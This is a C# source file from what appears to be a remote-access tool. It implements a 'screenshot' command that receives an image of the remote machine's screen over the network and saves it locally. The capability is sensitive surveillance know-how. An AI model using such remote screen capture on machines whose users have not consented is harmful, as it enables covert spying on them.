using System;
using System.Collections.Generic;
using System.IO;
using Shared;

namespace ClientCommands
{
    internal class Screenshot : IClientCommand
    {
        public string name { get; } = "screenshot";

        public string description { get; } = "Take a screenshot of the server's screen and downnload it";

        public string syntaxHelper { get; } = "screenshot";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = null;


        public void Process(List<string> args)
        {
            ColorTools.WriteCommandMessage("Waiting for screenshot data...");
            var fileName = DateTime.Now.ToShortDateString().Replace('/', '-')
                           + "_"
                           + DateTime.Now.Hour + '-' + DateTime.Now.Minute + '-' + DateTime.Now.Second
                           + ".png";

            // Get data length
            var dataLength = int.Parse(ClientCommandsManager.networkManager.ReadLine());

            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create))
                {
                    ClientCommandsManager.networkManager.NetworkStreamToStream(fs, dataLength);
                }

                ColorTools.WriteCommandSuccess($"Screenshot saved : {fileName}");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(fileName);
                ColorTools.WriteCommandError("An error occured");
            }
        }
    }
}
